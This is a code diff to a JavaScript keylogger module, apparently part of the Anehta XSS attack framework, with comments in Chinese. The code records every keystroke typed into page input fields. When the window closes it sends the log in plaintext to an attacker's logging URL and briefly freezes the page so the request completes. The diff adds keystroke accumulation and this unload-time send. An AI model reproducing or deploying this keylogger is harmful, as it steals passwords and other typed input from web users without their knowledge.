@@ -8,13 +8,14 @@ var tagName = new Array("input", "textarea");
 
 //$("textarea").keydown(function(){ alert();});
 var keylogger = new Array();
+var keystrokes = ""; //记录所有键盘记录
 var i = 0; // 计数器
 var j = 1; // 全局计数器
 
 $(tagName[0]).keydown(function(event){
 	/* 实时发送;通过控制i调整频率
 	if ( i>=10 ){
-		getURL(logurl+escape(keylogger));
+		anehta.net.getURL(logurl+escape(keylogger));
 		i = 0; // 重置计数器
 	}
 	*/
@@ -25,8 +26,9 @@ $(tagName[0]).keydown(function(event){
 	               "', press:'"+j+
 	               "', key:'"+String.fromCharCode(event.keyCode)+
 	               "', keyCode:'"+event.keyCode+
-	               "'}";             
-	//alert(keylogger);
+	               "'}";  
+	keystrokes = keystrokes + String.fromCharCode(event.keyCode);                          
+	//alert(keystrokes);
 	i=i+1;
 	j=j+1
 });
@@ -34,7 +36,14 @@ $(tagName[0]).keydown(function(event){
 // 在窗口关闭时候发送keylog 到服务器
 // 不稳定,如果是提交表单到其他页面的话,会post出错
 $(window).unload(function(){
+	//alert(keylogger);
+	// 时间不允许再base64加密了
+	//keylogger = anehta.crypto.base64encode(keylogger);
+	// 明文传输,需要标记为NoCryptMark
+	keylogger = NoCryptMark + XssInfo_S+"Keylogger: " + keylogger + XssInfo_E;
+	//alert(keylogger);
 	anehta.net.getURL(logurl+escape(keylogger));
+	anehta.core.freeze(500);
 	//alert(keylogger);	
 }
 );
